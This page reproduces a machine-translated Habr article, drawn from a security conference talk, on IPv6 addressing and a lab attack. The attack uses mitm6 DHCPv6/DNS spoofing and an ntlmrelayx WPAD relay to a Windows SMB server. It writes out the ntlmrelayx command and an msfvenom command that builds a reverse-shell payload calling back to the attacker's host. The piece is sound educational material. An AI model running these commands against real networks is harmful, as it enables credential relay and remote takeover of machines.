<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Where to insert quotation mark in IPv6</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="IPv6 is a new version of internet protocol. IETF members accepted it only 22 years ago, in 1996. During this time, IPv6-specific attacks have appeared...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Where to insert quotation mark in IPv6</h1><div class="post__text post__text-html js-mediator-article">  IPv6 is a new version of internet protocol.  IETF members accepted it only 22 years ago, in 1996.  During this time, IPv6-specific attacks have appeared.  The purpose of this article, based on our speech on <a href="https://www.phdays.com/ru/program/schedule/">PHDays 8,</a> is to show the possibility of an attacker on an intruder in corporate networks using IPv4 and IPv6. <br><br><img src="https://habrastorage.org/webt/ls/nb/b7/lsnbb7p7odub6aicoy6uylbvcak.png"><br><a name="habracut"></a><br><h2>  Basics of IPv6 Addressing </h2><br>  The length of an IPv6 address is 128 bits, which are written in hexadecimal format with the division of the entire address into 8 groups.  An example of writing an IPv6 address: <br><br>  2001: 0a00: cafe: babe: 0001: 0000: 0000: 0011/64 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      There is a simplified address entry, when several subsequent groups of zeros can be replaced by ‚Äú::‚Äù, but only once.  The zeros written to the left of each group may be discarded.  Hence, the address above can be written in the form: <br><br>  2001: a00: cafe: babe: 1 :: 11/64 <br><br>  The standard size of the host part issued by the provider to the client is 64 bits, of which 4 are used to segment the network into subnets. <br><br><img src="https://habrastorage.org/webt/ae/0r/2b/ae0r2bmvkfpwm8bvbwdlui_560i.png"><br><br>  In IPv6, there are several types of addresses: <br><br><img src="https://habrastorage.org/webt/cr/e2/zz/cre2zzzair09k_qyg-ozm_olyno.png"><br>  <b>Global unicast (Global unicast)</b> is an analogue of public addresses in IPv4.  These addresses are issued by <a href="https://www.iana.org/assignments/ipv6-unicast-address-assignments/ipv6-unicast-address-assignments.xhtml">IANA</a> and are unique throughout the entire Internet.  These addresses are in the range 2000 :: / 3 (2000 - 3FFF). <br><br>  <b>Local addresses (Link-local)</b> - addresses in the FE80 :: / 10 range (FE80 - FEBF), are automatically generated by devices and used to communicate with other devices on the same local area network.  Traffic containing this address as sender or recipient should not be routed.  Thus, a device with IPv6 support and connected to the network can immediately exchange information within its subnet without any configuration. <br><br>  <b>Loopback address :: 1</b> .  This address is similar to 127.0.0.1 in IPv4.  The packets sent to it do not leave the device. <br><br>  <b>Unspecified address</b> - the "::" address consisting of all zeros.  Used in some cases as a sender until the receipt of the address. <br><br>  <b>Unique local addresses (Unique local)</b> - analogue of private addresses in IPv4, can be routed within the organization‚Äôs internal network, without the possibility of routing to the Internet.  The IPv6 address space is so large that more than a trillion addresses can be given to every person on the planet and they will not end.  Therefore, IPv6 implies the rejection of private addresses in the sense in which they were used in IPv4 due to the lack of public addresses. <br><br>  <b>IPv4 addresses mapped to IPv6 (IPv4 embedded)</b> - IPv6 addresses starting with :: ffff: the last 32 bits of which contain an IPv4 address (:: ffff: xxxx: xxxx, where xxxx: xxxx is the IPv4 address translated to hexadecimal).  These addresses are used for non-IPv6 devices and provide a way to map the IPv4 address space to the IPv6 address space. <br><br>  <b>Multicast addresses</b> are one of the key changes in IPv6 versus IPv4.  The new protocol rejected the broadcast packets, instead of the broadcast address, multicast addresses are used.  All these addresses are in the range FF00 :: / 8 <br><br><img src="https://habrastorage.org/webt/gw/io/c6/gwioc6toxuatii_wzugt5yb3j2w.png"><br><br><h3>  Assigning an IPv6 Address </h3><br>  To obtain address information in IPv6, the ICMPv6 Neighbor Discovery Protocol (ND) is used.  As shown in the figure below, when a new device appears on the IPv6 network, the device sends a request for obtaining an IPv6 address (Router Solicitation) to ‚Äúff02 :: 2‚Äù (all routers of the network).  The router responds with a message (Router Advertisement) containing information on how to obtain an IPv6 address.  Depending on the flags set in the message, there are three ways: <br><table><tbody><tr><th>  The way to get the address </th><th>  A (Auto) flag </th><th>  O (Other) flag </th><th>  M (Managed) flag </th></tr><tr><td>  SLAAC (default) </td><td>  one </td><td>  0 </td><td>  0 </td></tr><tr><td>  SLAAC + DHCPv6 </td><td>  one </td><td>  one </td><td>  0 </td></tr><tr><td>  DHCPv6 </td><td>  0 </td><td>  - </td><td>  one </td></tr></tbody></table><br>  <b>SLAAC</b> (Stateless Address Autoconfiguration) - In this case, everything needed to generate a global IPv6 address is in the RA message. <br><br>  <b>SLAAC + DHCPv6</b> - As in the case of SLAAC, the address is generated based on the information in the RA packet, but the O flag is set additionally, which means Other configuration, and the device needs to contact the DHCPv6 server to obtain additional settings, such as DNS server. <br><br>  <b>DHCPv6</b> - analog DHCPv4 address and all other information is issued by the DHCP server, with the exception of the default gateway, which is taken from the sender address of the RA packet. <br><br>  When simultaneously setting the O and M flags, the O flag is ignored. <br><br><img src="https://habrastorage.org/webt/qx/nh/yw/qxnhywmpu6bpogmnss7c0emprpa.jpeg"><br>  As an example, take the fake_router26 utility from the <a href="https://github.com/vanhauser-thc/thc-ipv6">thc-ipv6</a> utility set.  The image shows that after the launch, the IPv6 address of the default gateway was added, which became the priority of IPv4. <br><br><img src="https://habrastorage.org/webt/mr/qc/45/mrqc45-7fxz_clcr6affsl69i9e.png"><br><br><h2>  We attack! </h2><br>  In this scenario, we will consider the possibility of a man-in-the-middle attack using the IPv6 network configuration mechanism. <br><br>  For the demonstration we need 4 cars: <br><br>  <b>Attacking machine</b> Kali Linux. <br><br><img src="https://habrastorage.org/webt/2z/rj/2p/2zrj2parlezr5m5thp1abcskgxo.png"><br><br>  <b>The server machine</b> on which the Windows 7 admin balls will be enabled. <br><br><img src="https://habrastorage.org/webt/tl/n3/qj/tln3qjafwp_zhancgxbpogpd5u4.png"><br><br>  <b>A client machine</b> that will have access to a Windows 7 server. <br><br><img src="https://habrastorage.org/webt/ob/vb/82/obvb82baad3u7bd4cmjlm-54atc.png"><br><br>  Router with DHCPv4 enabled. <br><br>  dirkjanm described the <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">methodology of</a> this scenario.  He wrote the mitm6 utility, which, using the ND protocol, sends Router Advertisment messages with the ‚ÄúO‚Äù and ‚ÄúM‚Äù flags set to ‚Äú1‚Äù.  Thus, clients know that it is necessary to request address information from a DHCPv6 server.  Clients begin to send DHCPv6 SOLICIT messages to discover a DHCP server.  The utility responds to requests sent with DHCPv6 ADVERTISE messages;  The response contains the address of the attacking machine as a DNS server. <br><br><img alt="Request for address information sent to the multicast address of all DHCP servers ff02 :: 1: 2" src="https://habrastorage.org/webt/ze/if/di/zeifdiuqvmjxgmsakw5nz5dqqau.png"><br><br>  After that, due to the architectural features of the DHCPv6 operating system, DNS becomes a priority.  Now an attacker can respond to any DNS requests with the desired address.  Thus, the request sent by the domain name will be sent to the attacker. <br><br>  By running mitm6, you can specify the domain for which to substitute DNS addresses. <br><br><img src="https://habrastorage.org/webt/cj/b5/mt/cjb5mthduecqu62-iig9ed9u24w.png"><br><br><img src="https://habrastorage.org/webt/ox/bz/bu/oxbzbuxhk777trjsfvr4idkkgdw.png"><br><br><h2>  Admin Balls </h2><br>  To enhance the dramatic effect, let us assume that there is another machine on the network on which the user of the first machine is allowed to connect to administrative balls.  By default, they are turned off, but many people on the Internet are interested in how to turn them on, and are very happy when they do it. <br><br><img src="https://habrastorage.org/webt/gi/yj/qt/giyjqt4gwprslmxgsgc_i2b_5_k.jpeg"><br><br><img src="https://habrastorage.org/webt/d-/gg/mp/d-ggmpf_b9oztu5dfrotewmbw9o.png"><br><br>  <a href="https://ru.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol">WPAD</a> (Web Proxy Auto Discovery) is a protocol for determining the location of the file in which the default proxy server settings are located. <br><br>  After updating <a href="https://support.microsoft.com/en-us/help/3165191/ms16-077-security-update-for-wpad-june-14-2016">MS16-077,</a> wpad is no longer delivered via NETBIOS and is not authenticated automatically on the proxy server. <br><br>  To circumvent these restrictions, you can use ntlmrelayx.py, which is part of <a href="https://github.com/CoreSecurity/impacket">impacket</a> .  A version higher than 0.9.16 is needed, which includes support for IPv6 and the ability to install a server that provides a valid wpad.  Run by command <br><br><pre><code class="bash hljs">ntlmrelayx.py -6 -wh at.localdomain -t smb://192.168.56.7 -e 1.exe</code> </pre> <br>  where 1.exe is a reverse-shell payload generated by a meta-exploit. <br><br><pre> <code class="bash hljs">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.6 LPORT=444 -f exe -o 1.exe</code> </pre> <br>  the -wh parameter points to the host where the wpad file is located (the mitm6 utility will respond with the attacker's address to this request) <br><br><img src="https://habrastorage.org/webt/4e/ew/hh/4eewhhpvwjynispsnazoyftxtus.png"><br><br><img src="https://habrastorage.org/webt/p1/it/aa/p1itaa9idtzcavemj45sgzsbeeq.png"><br><br>  After connecting, HTTP authentication 407 (Proxy Authentication Required) will be requested, to which the browser is automatically authenticated. <br><br><img src="https://habrastorage.org/webt/fw/hn/qz/fwhnqzgqri-snconlo2sdpubcmc.png"><br><br><img src="https://habrastorage.org/webt/f5/hf/1x/f5hf1xuyeourcueod8v70dqilsa.png"><br><br>  The received data will be used to connect to the smb of the attacked server, transmitted via the -t parameter. <br><br><img src="https://habrastorage.org/webt/xa/hu/0e/xahu0errtgiiuzu9j_b1990pryq.png"><br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/WO2jeo85Mpg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  I thank my co-author Sergei Ovchinnikov <a href="https://habr.com/users/malchikserega/" class="user_link">malchikserega</a> for helping <a href="https://habr.com/users/malchikserega/" class="user_link">me</a> prepare my speech and article. </div><p>Source: <a href="https://habr.com/ru/post/417285/">https://habr.com/ru/post/417285/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../417271/index.html">Can a hacker block the English Channel?</a></li>
<li><a href="../417273/index.html">The implementation of the voice directory based on YandexSpeechKit</a></li>
<li><a href="../417275/index.html">7 skills of effective designers. Powerful development tools in the profession</a></li>
<li><a href="../417277/index.html">Free libraries for creating and editing PDF files</a></li>
<li><a href="../417283/index.html">Disney introduced its own hair animation system HairControl</a></li>
<li><a href="../417287/index.html">"Calendar of the tester" for July. Analytics testing</a></li>
<li><a href="../417289/index.html">Internship Diary: Day 1. From intern to junior</a></li>
<li><a href="../417293/index.html">Password recovery and primary storage in the cloud, or What's new in Zimbra 8.8.9</a></li>
<li><a href="../417295/index.html">As I wrote the standard C ++ 11 library or why the boost is so scary. Chapter 3</a></li>
<li><a href="../417297/index.html">Fear and Loath Threat Intelligence or 8 TI Practical Tips</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>